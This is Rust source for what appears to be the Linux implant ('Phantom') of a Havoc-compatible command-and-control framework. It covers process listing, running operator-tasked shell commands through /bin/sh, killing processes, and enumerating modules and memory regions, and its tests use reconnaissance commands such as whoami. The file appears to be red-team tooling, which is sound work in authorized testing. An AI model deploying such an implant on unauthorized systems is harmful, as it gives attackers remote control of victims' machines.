//! `CommandProcList` / `CommandProc`: process listing and management.

use std::collections::BTreeMap;
use std::ffi::OsString;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use std::os::unix::fs::MetadataExt;

use red_cell_common::demon::{DemonCommand, DemonProcessCommand};
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

use super::encode::*;
use super::types::{MemoryRegion, PendingCallback, ProcessEntry};
use super::{PhantomState, io_error};

use super::sysinfo::{
    MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
    PAGE_WRITECOPY,
};

/// Strip a leading `"C:\…\cmd.exe"` segment from args (Havoc `CommandProc` create).
fn strip_leading_quoted_windows_cmd(args_trim: &str) -> &str {
    if !args_trim.starts_with('"') {
        return args_trim;
    }
    if let Some(end) = args_trim[1..].find('"') {
        return args_trim[1 + end + 1..].trim_start();
    }
    args_trim
}

/// Strip Havoc/Red Cell Windows shell wrapping so the inner command can run on Linux.
///
/// The teamserver's [`red_cell_common::demon::format_proc_create_args`] base64-encodes
/// a quoted `"C:\Windows\System32\cmd.exe" /c …` line in the args field (and may set
/// `program` to the same `cmd.exe` path).  Phantom must not spawn
/// `/bin/sh -c "…cmd.exe…"` as a POSIX binary.  When the process path targets
/// `cmd.exe` and args begin with `/c` (optionally after a quoted executable), we strip
/// to the inner script (same idea as Specter's `translate_to_shell_cmd`).
fn extract_havoc_posix_shell_inner(process: &str, args: &str) -> Option<String> {
    if args.is_empty() {
        return None;
    }
    let args_trim = args.trim_start();
    let args_lower = args_trim.to_ascii_lowercase();
    if args_lower.starts_with("cmd.exe /c") {
        let rest = args_trim.get("cmd.exe /c".len()..).unwrap_or("").trim_start();
        return Some(if rest.is_empty() { String::from("true") } else { rest.to_string() });
    }

    let proc_lower = process.to_ascii_lowercase();
    let is_cmd_path = !process.is_empty()
        && (proc_lower.ends_with("cmd.exe")
            || proc_lower.ends_with("\\cmd")
            || proc_lower == "cmd.exe"
            || proc_lower == "cmd");

    if is_cmd_path {
        let rest = strip_leading_quoted_windows_cmd(args_trim);
        let rest_lower = rest.to_ascii_lowercase();
        if rest_lower.starts_with("/c ") {
            let inner = rest[3..].trim_start();
            return Some(if inner.is_empty() { String::from("true") } else { inner.to_string() });
        }
        if rest_lower.starts_with("/c") && rest.len() > 2 {
            let inner = rest[2..].trim_start();
            return Some(if inner.is_empty() { String::from("true") } else { inner.to_string() });
        }
    }

    None
}

/// List all processes on the system.
pub(super) fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let process_ui = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
    let processes = enumerate_processes()?;
    encode_process_list(process_ui, &processes)
}

/// Handle `CommandProc` subcommands: create, kill, grep, modules, memory.
pub(super) async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let verbose = parser.bool32()?;

            let translated = extract_havoc_posix_shell_inner(&process, &process_args);

            let binary = if translated.is_some() || process.is_empty() {
                String::from("/bin/sh")
            } else {
                process
            };

            let mut command = Command::new(&binary);
            match translated {
                Some(script) => {
                    command.arg("-c").arg(script);
                }
                None if process_args.is_empty() => {
                    if binary == "/bin/sh" {
                        command.arg("-c").arg("true");
                    }
                }
                None if binary == "/bin/sh" => {
                    command.arg("-c").arg(process_args);
                }
                None => {
                    command.args(split_args(&process_args));
                }
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                let pid = child.id().unwrap_or_default();
                let output = child
                    .wait_with_output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                // Suppress verbose banner when piped — the banner would be
                // persisted as a separate output entry that shadows the actual
                // command stdout in CLI polling.
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(&binary, pid, true, true, false)?,
                });
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                // Include trailing exit code (i32 LE) matching Specter wire format.
                // Unix: `code()` is None when terminated by signal — use -1 (not 0).
                let exit_code = output.status.code().unwrap_or(-1);
                let mut out_payload = encode_bytes(merged.as_bytes())?;
                out_payload.extend_from_slice(&exit_code.to_le_bytes());
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandOutput),
                    request_id,
                    payload: out_payload,
                });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(
                        &binary,
                        child.id().unwrap_or_default(),
                        true,
                        false,
                        verbose,
                    )?,
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let success = Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?
                .success();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_kill(success, pid),
            });
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = enumerate_processes()?
                .into_iter()
                .filter(|process| process.name.to_lowercase().contains(&needle))
                .collect::<Vec<_>>();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_grep(&filtered)?,
            });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let modules = enumerate_modules(pid)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_modules(pid, &modules)?,
            });
        }
        DemonProcessCommand::Memory => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let query_protection = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
            let regions = enumerate_memory_regions(pid, query_protection)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_memory(pid, query_protection, &regions),
            });
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Process enumeration helpers
// ---------------------------------------------------------------------------

pub(super) fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
    let mut processes = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        match read_process_entry(pid) {
            Ok(process) => processes.push(process),
            Err(PhantomError::Io { message, .. })
                if message.contains("No such file or directory") =>
            {
                continue;
            }
            Err(error) => return Err(error),
        }
    }
    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
    Ok(processes)
}

fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
    let proc_path = PathBuf::from(format!("/proc/{pid}"));
    let status = fs::read_to_string(proc_path.join("status"))
        .map_err(|error| io_error(proc_path.join("status"), error))?;
    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
    let parent_pid = status_field(&status, "PPid")
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();
    let threads =
        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
    let session = read_process_session(pid).unwrap_or_default();
    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;

    Ok(ProcessEntry {
        name: executable_name(&exe),
        pid,
        parent_pid,
        session,
        threads,
        user: username_for_uid(metadata.uid()),
        is_wow64,
    })
}

fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
    status.lines().find_map(|line| {
        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
    })
}

fn read_process_session(pid: u32) -> Option<u32> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let suffix = stat.split_once(") ")?.1;
    let fields = suffix.split_whitespace().collect::<Vec<_>>();
    fields.get(3)?.parse::<u32>().ok()
}

fn process_arch_bits(exe: &Path) -> Option<u32> {
    let header = fs::read(exe).ok()?;
    if header.len() < 5 || &header[..4] != b"\x7FELF" {
        return None;
    }
    match header[4] {
        1 => Some(32),
        2 => Some(64),
        _ => None,
    }
}

fn username_for_uid(uid: u32) -> String {
    fs::read_to_string("/etc/passwd")
        .ok()
        .and_then(|passwd| {
            passwd.lines().find_map(|line| {
                let mut fields = line.split(':');
                let username = fields.next()?;
                let _password = fields.next()?;
                let entry_uid = fields.next()?.parse::<u32>().ok()?;
                (entry_uid == uid).then(|| username.to_string())
            })
        })
        .unwrap_or_else(|| uid.to_string())
}

pub(super) fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut modules = BTreeMap::new();
    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(range) = parts.next() else {
            continue;
        };
        let path = parts.nth(4).unwrap_or_default();
        if path.is_empty() || !path.starts_with('/') {
            continue;
        }
        let Some((base, _)) = range.split_once('-') else {
            continue;
        };
        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
            continue;
        };
        modules.entry(path.to_string()).or_insert(base_addr);
    }
    Ok(modules.into_iter().collect())
}

pub(super) fn enumerate_memory_regions(
    pid: u32,
    query_protection: u32,
) -> Result<Vec<MemoryRegion>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut regions = contents
        .lines()
        .filter_map(parse_memory_region)
        .filter(|region| query_protection == 0 || region.protect == query_protection)
        .collect::<Vec<_>>();
    regions.sort_by(|left, right| left.base.cmp(&right.base));
    Ok(regions)
}

pub(super) fn parse_memory_region(line: &str) -> Option<MemoryRegion> {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let range = *fields.first()?;
    let perms = *fields.get(1)?;
    let path = fields.get(5).copied();
    let (start, end) = range.split_once('-')?;
    let base = u64::from_str_radix(start, 16).ok()?;
    let end = u64::from_str_radix(end, 16).ok()?;
    let size = u32::try_from(end.checked_sub(base)?).ok()?;
    let protect = map_linux_protection(perms);
    let mem_type = map_linux_memory_type(perms, path);
    Some(MemoryRegion { base, size, protect, state: MEM_COMMIT, mem_type })
}

pub(super) fn map_linux_protection(perms: &str) -> u32 {
    match perms.as_bytes() {
        [b'-', b'-', b'-', b'-', ..] => PAGE_NOACCESS,
        [b'r', b'-', b'-', b'-', ..] => PAGE_READONLY,
        [b'r', b'w', b'-', b'p', ..] => PAGE_READWRITE,
        [b'r', b'w', b'-', b's', ..] => PAGE_WRITECOPY,
        [b'-', b'-', b'x', b'-', ..] => PAGE_EXECUTE,
        [b'r', b'-', b'x', b'p', ..] | [b'r', b'-', b'x', b's', ..] => PAGE_EXECUTE_READ,
        [b'r', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'r', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'w', b'-', b'p', ..] | [b'-', b'w', b'-', b's', ..] => PAGE_READWRITE,
        [b'-', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'-', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'-', b'x', b'p', ..] | [b'-', b'-', b'x', b's', ..] => PAGE_EXECUTE,
        _ => PAGE_NOACCESS,
    }
}

pub(super) fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
    match path {
        Some(path) if path.starts_with('/') => {
            if perms.contains('x') {
                MEM_IMAGE
            } else {
                MEM_MAPPED
            }
        }
        _ => MEM_PRIVATE,
    }
}

pub(super) fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

#[cfg(test)]
mod havoc_shell_extract_tests {
    use super::extract_havoc_posix_shell_inner;

    #[test]
    fn empty_process_cmd_exe_c_strips_prefix() {
        assert_eq!(
            extract_havoc_posix_shell_inner("", "cmd.exe /c whoami").as_deref(),
            Some("whoami")
        );
    }

    #[test]
    fn empty_process_cmd_exe_c_case_insensitive_prefix() {
        assert_eq!(
            extract_havoc_posix_shell_inner("", "CMD.EXE /c echo ok").as_deref(),
            Some("echo ok")
        );
    }

    #[test]
    fn windows_cmd_path_with_slash_c() {
        assert_eq!(
            extract_havoc_posix_shell_inner(r"C:\Windows\System32\cmd.exe", "/c hostname")
                .as_deref(),
            Some("hostname")
        );
    }

    #[test]
    fn windows_cmd_path_with_quoted_executable_and_slash_c() {
        let path = r"C:\Windows\System32\cmd.exe";
        let args = r#""C:\Windows\System32\cmd.exe" /c whoami"#;
        assert_eq!(extract_havoc_posix_shell_inner(path, args).as_deref(), Some("whoami"));
    }

    #[test]
    fn plain_sh_invoke_not_matched() {
        assert_eq!(extract_havoc_posix_shell_inner("", "echo hi"), None);
        assert_eq!(extract_havoc_posix_shell_inner("/bin/sh", "echo hi"), None);
    }
}
